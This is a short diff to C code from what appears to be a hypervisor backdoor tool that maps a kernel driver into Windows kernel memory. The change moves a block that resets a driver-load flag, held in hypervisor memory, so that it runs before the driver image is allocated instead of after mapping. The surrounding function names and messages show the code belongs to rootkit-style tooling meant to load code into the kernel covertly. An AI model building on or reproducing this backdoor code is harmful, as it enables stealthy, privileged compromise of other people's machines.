@@ -448,6 +448,20 @@ _nt_found:
 
         printf("[+] Kernel driver virtual address is 0x%llx (size: 0x%x)\n", driver_base_virt, driver_size);
         
+        /*
+            We're using HVBD_DATA structure field as temporary hypervisor memory area
+            to store kernel kernel driver load flag (see backdoor_driver.cpp)
+        */
+        if (backdoor_ept_info_addr(&count_addr) != 0)
+        {
+            goto _end;
+        }
+
+        if (backdoor_virt_write_32(count_addr, 0) != 0)
+        {
+            goto _end;
+        }
+
         uint8_t *driver_image = (uint8_t *)malloc(driver_size);
         if (driver_image)
         {
@@ -612,21 +626,7 @@ _nt_found:
             goto _end;
         }   
 
-        printf("[+] Kernel driver mapped to the 0x%llx\n", driver_base_virt);
-
-        /*
-            We're using HVBD_DATA structure field as temporary hypervisor memory area
-            to store kernel kernel driver load flag (see backdoor_driver.cpp)
-        */
-        if (backdoor_ept_info_addr(&count_addr) != 0)
-        {
-            goto _end;
-        }
-
-        if (backdoor_virt_write_32(count_addr, 0) != 0)
-        {
-            goto _end;
-        }
+        printf("[+] Kernel driver mapped to the 0x%llx\n", driver_base_virt);        
 
         memset(nt_func_jump, 0x90, sizeof(nt_func_jump));
 
